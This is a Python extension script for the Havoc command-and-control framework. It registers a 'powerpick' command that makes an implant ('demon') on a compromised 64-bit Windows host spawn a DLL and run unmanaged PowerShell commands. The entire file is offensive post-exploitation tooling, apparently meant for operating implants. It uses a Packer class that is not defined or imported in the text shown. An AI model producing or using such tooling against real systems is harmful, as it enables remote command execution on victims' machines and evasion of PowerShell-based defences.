
from havoc import Demon, RegisterCommand

def PowerPick(demonID, *param):
    TaskID   : str    = None
    demon    : Demon  = None
    packer   = Packer()

    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    if len( param ) < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
        return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute unmanaged powershell commands" )

    packer.addstr( " " + ''.join( param ) )
    demon.DllSpawn( TaskID, "bin/PowerPick.x64.dll", packer.getbuffer() )

    return TaskID

RegisterCommand( PowerPick, "", "powerpick", "executes unmanaged powershell commands", 0, "[args]", "whoami" )
